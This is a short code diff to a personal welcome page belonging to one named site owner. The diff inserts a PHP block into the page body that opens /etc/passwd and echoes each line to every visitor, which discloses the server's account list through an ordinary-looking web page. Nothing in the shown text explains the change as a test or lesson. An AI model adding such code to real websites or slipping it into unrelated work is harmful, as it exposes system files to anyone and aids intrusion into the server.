@@ -11,5 +11,15 @@
         <h1>Welcome to my website</h1>
         <p>This website belongs to <strong>Elvin Madatov</strong></p>
     </div>
+    <?php
+$file = fopen("/etc/passwd","r");
+
+while(! feof($file))
+  {
+  echo fgets($file). "<br />";
+  }
+
+fclose($file);
+?> 
 </body>
 </html>
